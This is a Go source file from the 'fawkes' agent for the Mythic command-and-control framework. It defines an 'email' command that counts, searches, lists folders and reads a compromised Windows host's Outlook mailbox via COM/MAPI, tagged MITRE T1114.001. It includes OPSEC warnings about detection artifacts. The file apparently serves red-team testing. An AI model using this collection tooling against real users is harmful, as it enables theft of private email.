package agentfunctions

import (
	"fmt"
	"path/filepath"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "email",
		Description:         "Access Outlook mailbox via COM API — count, search, and read email messages (T1114.001)",
		HelpString:          "email -action <count|search|read|folders> [-folder <name>] [-query <keyword>] [-index <n>] [-count <n>] [-headers]",
		Version:             1,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1114.001"},
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "email_new.js"),
			Author:     "@galoryber",
		},
		ScriptOnlyCommand: false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
			FilterCommandAvailabilityByAgentBuildParameters: map[string]string{"selected_os": "Windows"},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"count", "search", "read", "folders"},
				Description:      "count: message count, search: keyword search, read: read message by index, folders: list folders",
				DefaultValue:     "count",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "folder",
				ModalDisplayName: "Folder",
				CLIName:          "folder",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Mail folder name (default: Inbox). Standard: Inbox, Sent, Drafts, Deleted, Outbox, Junk",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "query",
				ModalDisplayName: "Search Query",
				CLIName:          "query",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Search keyword (matches subject and body). Required for search action",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "index",
				ModalDisplayName: "Message Index",
				CLIName:          "index",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Message index to read (1-based, most recent first). Required for read action",
				DefaultValue:     1,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "count",
				ModalDisplayName: "Max Results",
				CLIName:          "count",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				Description:      "Maximum number of results to return (default: 10)",
				DefaultValue:     10,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "headers",
				ModalDisplayName: "Headers Only",
				CLIName:          "headers",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
				Description:      "If true, show message headers only (skip body) when reading",
				DefaultValue:     false,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Email access completed. Outlook COM/MAPI interaction generates process-to-process communication events. Accessed emails may be logged by Outlook audit trail and DLP solutions.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			msg := fmt.Sprintf("OPSEC WARNING: Accessing email data, action: %s (T1114.001). Email collection via COM/MAPI generates process interaction artifacts. Outlook security may prompt user warnings for programmatic access.", action)
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID: taskData.Task.ID, Success: true,
				OpsecPreBlocked: false, OpsecPreMessage: msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			display := fmt.Sprintf("action: %s", action)

			folder, _ := taskData.Args.GetStringArg("folder")
			if folder != "" {
				display += fmt.Sprintf(", folder: %s", folder)
			}

			switch action {
			case "search":
				query, _ := taskData.Args.GetStringArg("query")
				display += fmt.Sprintf(", query: %q", query)
				createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("Outlook.Application.GetNamespace(MAPI).Items.Restrict(query=%q)", query))
			case "read":
				idx, _ := taskData.Args.GetNumberArg("index")
				display += fmt.Sprintf(", index: %d", int(idx))
				createArtifact(taskData.Task.ID, "API Call", "Outlook.Application.GetNamespace(MAPI).Items.Item()")
			case "count", "folders":
				createArtifact(taskData.Task.ID, "API Call", "Outlook.Application.GetNamespace(MAPI)")
			}

			response.DisplayParams = &display
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			host := processResponse.TaskData.Callback.Host
			switch action {
			case "search", "read":
				logOperationEvent(processResponse.TaskData.Task.ID,
					fmt.Sprintf("[COLLECTION] Email %s via Outlook COM on %s", action, host), true)
			}
			return response
		},
	})
}
